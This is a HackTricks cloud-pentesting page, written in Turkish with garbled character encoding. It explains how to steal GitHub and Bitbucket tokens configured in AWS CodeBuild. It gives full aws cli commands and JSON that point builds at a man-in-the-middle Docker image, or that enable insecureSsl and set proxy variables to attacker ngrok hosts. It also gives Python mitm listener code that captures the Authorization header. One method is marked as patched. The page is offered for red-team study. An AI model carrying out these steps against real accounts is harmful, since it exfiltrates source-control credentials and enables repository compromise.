# AWS Codebuild - Token Leakage

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Github/Bitbucket YapÄ±landÄ±rÄ±lmÄ±ÅŸ Token'larÄ±nÄ± Kurtarma

Ã–ncelikle, sÄ±zdÄ±rabileceÄŸiniz herhangi bir kaynak kimlik bilgisi yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
aws codebuild list-source-credentials
```
### Docker GÃ¶rÃ¼ntÃ¼sÃ¼ Ãœzerinden

EÄŸer Ã¶rneÄŸin Github'a kimlik doÄŸrulamanÄ±n hesapta ayarlandÄ±ÄŸÄ±nÄ± bulursanÄ±z, Codebuild'i projenin derlemesini Ã§alÄ±ÅŸtÄ±rmak iÃ§in **belirli bir docker gÃ¶rÃ¼ntÃ¼sÃ¼** kullanmaya zorlayarak bu **eriÅŸimi** (**GH token veya OAuth token**) **sÄ±zdÄ±rabilirsiniz**.

Bu amaÃ§la **yeni bir Codebuild projesi oluÅŸturabilir** veya mevcut birinin **ortamÄ±nÄ±** deÄŸiÅŸtirerek **Docker gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼** ayarlayabilirsiniz.

KullanabileceÄŸiniz Docker gÃ¶rÃ¼ntÃ¼sÃ¼ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Bu, **env deÄŸiÅŸkenlerini `https_proxy`**, **`http_proxy`** ve **`SSL_CERT_FILE`** ayarlayacak Ã§ok temel bir Docker gÃ¶rÃ¼ntÃ¼sÃ¼dÃ¼r. Bu, **`https_proxy`** ve **`http_proxy`**'da belirtilen ana bilgisayarÄ±n trafiÄŸinin Ã§oÄŸunu kesmenizi ve **`SSL_CERT_FILE`**'da belirtilen SSL CERT'ine gÃ¼venmenizi saÄŸlar.

1. **Kendi Docker MitM gÃ¶rÃ¼ntÃ¼nÃ¼zÃ¼ oluÅŸturun ve yÃ¼kleyin**
* Proxy IP adresinizi ayarlamak ve SSL sertifikanÄ±zÄ± belirlemek iÃ§in repo talimatlarÄ±nÄ± izleyin ve **docker gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ oluÅŸturun**.
* Metadata uÃ§ noktasÄ±na yapÄ±lan istekleri kesmemek iÃ§in **`http_proxy`**'yu ayarlamayÄ±n.
* Proxy'yi ana bilgisayarÄ±nÄ±za ayarlamak iÃ§in **`ngrok`** kullanabilirsiniz, Ã¶rneÄŸin `ngrok tcp 4444`.
* Docker gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ oluÅŸturduktan sonra, **bunu halka aÃ§Ä±k bir repoya yÃ¼kleyin** (Dockerhub, ECR...).
2. **OrtamÄ± ayarlayÄ±n**
* **Yeni bir Codebuild projesi oluÅŸturun** veya mevcut birinin ortamÄ±nÄ± **deÄŸiÅŸtirin**.
* Projeyi **Ã¶nceden oluÅŸturulmuÅŸ Docker gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼** kullanacak ÅŸekilde ayarlayÄ±n.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Ana bilgisayarÄ±nÄ±zda MitM proxy'yi ayarlayÄ±n**

* **Github repo**'sunda belirtildiÄŸi gibi, ÅŸunu kullanabilirsiniz:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
KullanÄ±lan **mitmproxy sÃ¼rÃ¼mÃ¼ 9.0.1** idi, sÃ¼rÃ¼m 10 ile bunun Ã§alÄ±ÅŸmayabileceÄŸi bildirildi.
{% endhint %}

4. **YapÄ±yÄ± Ã§alÄ±ÅŸtÄ±rÄ±n ve kimlik bilgilerini yakalayÄ±n**

*   Token'Ä± **Authorization** baÅŸlÄ±ÄŸÄ±nda gÃ¶rebilirsiniz:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Bu, aws cli Ã¼zerinden de ÅŸÃ¶yle yapÄ±labilir:

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### Via insecureSSL

**Codebuild** projelerinin, yalnÄ±zca API'den deÄŸiÅŸtirilebilen, webde gizli bir ayarÄ± olan **`insecureSsl`** vardÄ±r.\
Bunu etkinleÅŸtirmek, Codebuild'in platform tarafÄ±ndan sunulan **sertifikayÄ± kontrol etmeden** depoya baÄŸlanmasÄ±na olanak tanÄ±r.

* Ã–ncelikle, mevcut yapÄ±landÄ±rmayÄ± ÅŸu ÅŸekilde listelemeniz gerekir:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
* ArdÄ±ndan, toplanan bilgilerle proje ayarÄ±nÄ± **`insecureSsl`** deÄŸerini **`True`** olarak gÃ¼ncelleyebilirsiniz. AÅŸaÄŸÄ±da bir projeyi gÃ¼ncellememe dair bir Ã¶rnek var, sonunda **`insecureSsl=True`** olduÄŸunu fark edin (bu, toplanan yapÄ±landÄ±rmadan deÄŸiÅŸtirmeniz gereken tek ÅŸeydir).
* AyrÄ±ca, tcp ngrok'unuza iÅŸaret eden **http\_proxy** ve **https\_proxy** ortam deÄŸiÅŸkenlerini de ekleyin: 

{% code overflow="wrap" %}
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "https://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
{% endcode %}

* ArdÄ±ndan, proxy deÄŸiÅŸkenleri tarafÄ±ndan belirtilen portta [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) adresinden temel Ã¶rneÄŸi Ã§alÄ±ÅŸtÄ±rÄ±n.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Son olarak, **Projeyi oluÅŸtur** butonuna tÄ±klayÄ±n, **kimlik bilgileri** **dÃ¼z metin olarak** (base64) mitm portuna **gÃ¶nderilecektir**:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### ~~HTTP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla~~

{% hint style="success" %}
**Bu zafiyet, 2023 Åubat ayÄ±nÄ±n 20'si haftasÄ±nda AWS tarafÄ±ndan bir noktada dÃ¼zeltildi (sanÄ±rÄ±m Cuma gÃ¼nÃ¼). Bu nedenle bir saldÄ±rgan bunu artÄ±k kÃ¶tÃ¼ye kullanamaz :)**
{% endhint %}

**YÃ¼kseltilmiÅŸ izinlere sahip bir saldÄ±rgan, yapÄ±landÄ±rÄ±lmÄ±ÅŸ Github/Bitbucket token'Ä±nÄ± sÄ±zdÄ±rabilir** veya izinler OAuth aracÄ±lÄ±ÄŸÄ±yla yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, **koda eriÅŸmek iÃ§in kullanÄ±lan geÃ§ici OAuth token'Ä±nÄ±** sÄ±zdÄ±rabilir.

* Bir saldÄ±rgan, CodeBuild projesine kendi makinesine iÅŸaret eden **http\_proxy** ve **https\_proxy** ortam deÄŸiÅŸkenlerini ekleyebilir (Ã¶rneÄŸin `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* ArdÄ±ndan, github repo'sunun URL'sini HTTPS yerine HTTP kullanacak ÅŸekilde deÄŸiÅŸtirin, Ã¶rneÄŸin: `http://github.com/carlospolop-forks/TestActions`
* ArdÄ±ndan, proxy deÄŸiÅŸkenleri (http\_proxy ve https\_proxy) tarafÄ±ndan iÅŸaret edilen portta [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) adresinden temel Ã¶rneÄŸi Ã§alÄ±ÅŸtÄ±rÄ±n.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Son olarak, **Projeyi oluÅŸtur** butonuna tÄ±klayÄ±n, **kimlik bilgileri** **dÃ¼z metin** (base64) olarak mitm portuna **gÃ¶nderilecektir**:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ArtÄ±k bir saldÄ±rgan, makinesinden token'Ä± kullanabilir, sahip olduÄŸu tÃ¼m ayrÄ±calÄ±klarÄ± listeleyebilir ve CodeBuild hizmetini doÄŸrudan kullanmaktan daha kolay bir ÅŸekilde (kÃ¶tÃ¼ye) kullanabilir.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
